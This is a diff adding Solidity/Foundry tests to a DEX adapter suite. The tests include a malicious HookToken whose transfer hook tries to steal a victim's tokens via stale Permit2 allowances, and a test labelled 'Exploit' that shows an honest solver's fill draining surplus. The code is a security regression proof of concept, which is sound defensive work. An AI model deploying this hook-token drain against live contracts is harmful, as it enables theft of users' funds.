@@ -30,6 +30,77 @@ contract Permit2Target is MockDexRouter {
         ERC20Mock(tokenIn).transferFrom(msg.sender, address(this), amount);
         tokenOut.mint(msg.sender, amount);
     }
+
+    function doPartialSwap(address tokenIn, uint256 spentAmountIn, address tokenOut, uint256 amountOut, address to)
+        external
+    {
+        ERC20Mock(tokenIn).transferFrom(msg.sender, address(this), spentAmountIn);
+        ERC20Mock(tokenOut).mint(to, amountOut);
+    }
+}
+
+contract MsgSenderPermit2Router {
+    function swapWithPermit2(
+        MockPermit2 permit2,
+        address tokenIn,
+        uint160 amountIn,
+        ERC20Mock tokenOut,
+        uint256 amountOut
+    ) external {
+        permit2.transferFrom(msg.sender, address(this), amountIn, tokenIn);
+        tokenOut.mint(msg.sender, amountOut);
+    }
+}
+
+contract HookToken is ERC20Mock {
+    Permit2Target public immutable previousTarget;
+    MsgSenderPermit2Router public immutable msgSenderRouter;
+    MockPermit2 public immutable permit2;
+    address public immutable tokenToSteal;
+    address public immutable victim;
+    uint160 public immutable stealAmount;
+    uint256 public hookCallCount;
+    bool public directPermit2Succeeded;
+    bool public msgSenderRouterSucceeded;
+    bool public arbitraryFromPullSucceeded;
+
+    constructor(
+        Permit2Target _previousTarget,
+        MsgSenderPermit2Router _msgSenderRouter,
+        MockPermit2 _permit2,
+        address _tokenToSteal,
+        address _victim,
+        uint160 _stealAmount
+    ) {
+        previousTarget = _previousTarget;
+        msgSenderRouter = _msgSenderRouter;
+        permit2 = _permit2;
+        tokenToSteal = _tokenToSteal;
+        victim = _victim;
+        stealAmount = _stealAmount;
+    }
+
+    function _update(address from, address to, uint256 value) internal override {
+        super._update(from, to, value);
+        if (from == address(0) && to == victim) {
+            hookCallCount++;
+            try permit2.transferFrom(victim, address(this), stealAmount, tokenToSteal) {
+                directPermit2Succeeded = true;
+            } catch {}
+
+            if (address(msgSenderRouter) != address(0)) {
+                try msgSenderRouter.swapWithPermit2(permit2, tokenToSteal, stealAmount, this, 0) {
+                    msgSenderRouterSucceeded = true;
+                } catch {}
+            }
+
+            if (address(previousTarget) != address(0)) {
+                try previousTarget.pull(permit2, tokenToSteal, victim, stealAmount) {
+                    arbitraryFromPullSucceeded = true;
+                } catch {}
+            }
+        }
+    }
 }
 
 contract DynamicP2DexAdapterTest is BaseTest {
@@ -207,6 +278,221 @@ contract DynamicP2DexAdapterTest is BaseTest {
 
         _assertZeroPermit2Allowances(address(previousTarget), solver, false);
         _assertZeroErc20Allowances(address(previousTarget), solver);
+    }
+
+    function test_honest_solver_can_be_forced_to_trigger_stale_permit2_allowance() public {
+        OrderReactor reactorUut = new OrderReactor(repermit, signer, wm);
+        Executor exec = new Executor(address(reactorUut), wm);
+        Permit2Target previousTarget = new Permit2Target();
+        address honestSolver = makeAddr("honestSolver");
+        allow(honestSolver);
+
+        reactor = address(reactorUut);
+        executor = address(exec);
+        adapter = address(adapterUut);
+        recipient = other;
+        inAmount = 1000 ether;
+        inMax = inAmount;
+        outAmount = 1000 ether;
+        uint256 surplus = 500 ether;
+        cosignInValue = 1;
+        cosignOutValue = 1;
+        slippage = 0;
+        freshness = 300;
+
+        // 1. Honest solver fills an initial order through previousTarget, leaving an unzeroed Permit2 allowance on Executor.
+        CosignedOrder memory firstOrder = _signedOrder();
+        vm.prank(honestSolver);
+        exec.execute(
+            firstOrder,
+            executionWithTargetData(
+                outAmount,
+                address(previousTarget),
+                abi.encodeCall(MockDexRouter.doSwap, (address(token), inAmount, address(token2), outAmount, executor))
+            )
+        );
+
+        (,, uint160 remaining, uint48 expiration) = permit2.allowance(executor, address(token), address(previousTarget));
+        assertEq(remaining, type(uint160).max);
+        assertEq(expiration, type(uint48).max);
+        assertEq(token.allowance(executor, address(permit2)), 0);
+
+        // 2. A later order uses an output token with a transfer hook; the honest solver routes normally through routerB.
+        HookToken hookToken = new HookToken(
+            previousTarget, MsgSenderPermit2Router(address(0)), permit2, address(token), executor, uint160(surplus)
+        );
+        outToken = address(hookToken);
+
+        // Control: when previousTarget's stale Permit2 allowance is zeroed, the honest fill distributes surplus to swapper.
+        uint256 snap = vm.snapshotState();
+        vm.prank(executor);
+        permit2.approve(address(token), address(previousTarget), 0, 0);
+
+        token.mint(executor, surplus);
+        CosignedOrder memory controlOrder = _signedOrder();
+        vm.prank(honestSolver);
+        exec.execute(
+            controlOrder,
+            executionWithTargetData(
+                outAmount,
+                address(routerB),
+                abi.encodeCall(
+                    MockDexRouter.doSwap, (address(token), inAmount, address(hookToken), outAmount, executor)
+                )
+            )
+        );
+
+        assertFalse(hookToken.directPermit2Succeeded());
+        assertFalse(hookToken.arbitraryFromPullSucceeded());
+        assertEq(token.balanceOf(address(previousTarget)), inAmount);
+        assertEq(token.balanceOf(address(routerB)), inAmount);
+        assertEq(token.balanceOf(honestSolver), 0);
+        assertEq(token.balanceOf(swapper), surplus);
+        assertEq(hookToken.balanceOf(recipient), outAmount);
+
+        // Exploit: with the stale Permit2 allowance left unzeroed, the exact same honest solver call drains surplus to previousTarget.
+        vm.revertToState(snap);
+        token.mint(executor, surplus);
+        CosignedOrder memory secondOrder = _signedOrder();
+        vm.prank(honestSolver);
+        exec.execute(
+            secondOrder,
+            executionWithTargetData(
+                outAmount,
+                address(routerB),
+                abi.encodeCall(
+                    MockDexRouter.doSwap, (address(token), inAmount, address(hookToken), outAmount, executor)
+                )
+            )
+        );
+
+        assertFalse(hookToken.directPermit2Succeeded());
+        assertTrue(hookToken.arbitraryFromPullSucceeded());
+        assertEq(token.balanceOf(address(previousTarget)), inAmount + surplus);
+        assertEq(token.balanceOf(address(routerB)), inAmount);
+        assertEq(token.balanceOf(honestSolver), 0);
+        assertEq(token.balanceOf(swapper), 0);
+        assertEq(token.balanceOf(executor), 0);
+        assertEq(hookToken.balanceOf(recipient), outAmount);
+    }
+
+    function test_stale_permit2_allowance_limits_across_sequential_trades_and_msg_sender_routers() public {
+        OrderReactor reactorUut = new OrderReactor(repermit, signer, wm);
+        Executor exec = new Executor(address(reactorUut), wm);
+        Permit2Target previousTarget = new Permit2Target();
+        MsgSenderPermit2Router msgSenderRouter = new MsgSenderPermit2Router();
+        Permit2Target partialRouter = new Permit2Target();
+        address honestSolver = makeAddr("honestSolver");
+        allow(honestSolver);
+
+        reactor = address(reactorUut);
+        executor = address(exec);
+        adapter = address(adapterUut);
+        recipient = other;
+        inAmount = 1000 ether;
+        inMax = inAmount;
+        outAmount = 1000 ether;
+        uint256 surplus = 500 ether;
+        cosignInValue = 1;
+        cosignOutValue = 1;
+        slippage = 0;
+        freshness = 300;
+
+        // 1. Prior trades with both input and output surplus are swept by Executor.execute after each fill (no accumulation).
+        for (uint256 i = 0; i < 2; i++) {
+            _executeAs(
+                honestSolver,
+                address(previousTarget),
+                abi.encodeCall(
+                    Permit2Target.doPartialSwap,
+                    (address(token), inAmount - surplus, address(token2), outAmount + surplus, executor)
+                )
+            );
+            assertEq(token.balanceOf(executor), 0);
+            assertEq(token2.balanceOf(executor), 0);
+        }
+        assertEq(token.balanceOf(swapper), 2 * surplus);
+        assertEq(token2.balanceOf(swapper), 2 * surplus);
+
+        // 2. Honest solver also fills through a Permit2 router that binds `from = msg.sender`.
+        _executeAs(
+            honestSolver,
+            address(msgSenderRouter),
+            abi.encodeCall(
+                MsgSenderPermit2Router.swapWithPermit2, (permit2, address(token), uint160(inAmount), token2, outAmount)
+            )
+        );
+        (,, uint160 msgSenderRemaining,) = permit2.allowance(executor, address(token), address(msgSenderRouter));
+        assertEq(msgSenderRemaining, type(uint160).max);
+
+        // 3. Even with seeded surplus, HookToken cannot pull directly from Permit2 or through msgSenderRouter (`from = msg.sender`).
+        HookToken safeRouterHookToken = new HookToken(
+            Permit2Target(address(0)), msgSenderRouter, permit2, address(token), executor, uint160(surplus)
+        );
+        outToken = address(safeRouterHookToken);
+        token.mint(executor, surplus);
+        uint256 swapperBefore = token.balanceOf(swapper);
+        _executeAs(
+            honestSolver,
+            address(routerB),
+            abi.encodeCall(
+                MockDexRouter.doSwap, (address(token), inAmount, address(safeRouterHookToken), outAmount, executor)
+            )
+        );
+        assertFalse(safeRouterHookToken.directPermit2Succeeded());
+        assertFalse(safeRouterHookToken.msgSenderRouterSucceeded());
+        assertEq(token.balanceOf(swapper) - swapperBefore, surplus);
+        assertEq(token.balanceOf(executor), 0);
+
+        // 4. Without stuck surplus or unspent input on the HookToken swap itself, even arbitrary-`from` previousTarget steals 0.
+        HookToken hookToken =
+            new HookToken(previousTarget, msgSenderRouter, permit2, address(token), executor, uint160(surplus));
+        outToken = address(hookToken);
+        uint256 previousTargetBefore = token.balanceOf(address(previousTarget));
+        _executeAs(
+            honestSolver,
+            address(routerB),
+            abi.encodeCall(MockDexRouter.doSwap, (address(token), inAmount, address(hookToken), outAmount, executor))
+        );
+        assertEq(hookToken.hookCallCount(), 1);
+        assertFalse(hookToken.directPermit2Succeeded());
+        assertFalse(hookToken.msgSenderRouterSucceeded());
+        assertFalse(hookToken.arbitraryFromPullSucceeded());
+        assertEq(token.balanceOf(address(previousTarget)) - previousTargetBefore, 0);
+
+        // Only when the HookToken swap itself leaves unspent input can arbitrary-`from` previousTarget take that single swap's surplus.
+        _executeAs(
+            honestSolver,
+            address(partialRouter),
+            abi.encodeCall(
+                Permit2Target.doPartialSwap,
+                (address(token), inAmount - surplus, address(hookToken), outAmount, executor)
+            )
+        );
+        assertEq(hookToken.hookCallCount(), 2);
+        assertTrue(hookToken.arbitraryFromPullSucceeded());
+        assertEq(token.balanceOf(address(previousTarget)) - previousTargetBefore, surplus);
+
+        // 5. Subsequent normal swaps (token -> token2) never invoke HookToken and distribute their own surplus normally.
+        outToken = address(token2);
+        swapperBefore = token.balanceOf(swapper);
+        _executeAs(
+            honestSolver,
+            address(partialRouter),
+            abi.encodeCall(
+                Permit2Target.doPartialSwap, (address(token), inAmount - surplus, address(token2), outAmount, executor)
+            )
+        );
+        assertEq(hookToken.hookCallCount(), 2);
+        assertEq(token.balanceOf(address(previousTarget)) - previousTargetBefore, surplus);
+        assertEq(token.balanceOf(swapper) - swapperBefore, surplus);
+        assertEq(token.balanceOf(executor), 0);
+    }
+
+    function _executeAs(address caller, address target, bytes memory data) internal {
+        CosignedOrder memory co = _signedOrder();
+        vm.prank(caller);
+        Executor(payable(executor)).execute(co, executionWithTargetData(outAmount, target, data));
     }
 
     function _signedOrder() internal returns (CosignedOrder memory co) {
